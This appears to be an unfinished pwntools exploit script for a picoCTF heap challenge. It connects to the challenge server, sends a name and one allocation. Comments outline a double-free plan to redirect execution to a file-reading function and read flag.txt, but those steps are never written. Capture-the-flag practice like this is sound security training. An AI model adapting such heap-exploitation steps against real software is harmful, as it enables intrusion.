from pwn import *
r = remote('jupiter.challenges.picoctf.org', 51860)
r.sendline(b'myname')

# 1. Write address of the function that reads a file
# Allocate
r.sendline(b'1')
r.sendline(b'4')
r.sendline(b'a' * 4)
# Double Free


# 2. Write the flag file name to BSS
# I'm going to assume that it's flag.txt, which is what it usually is
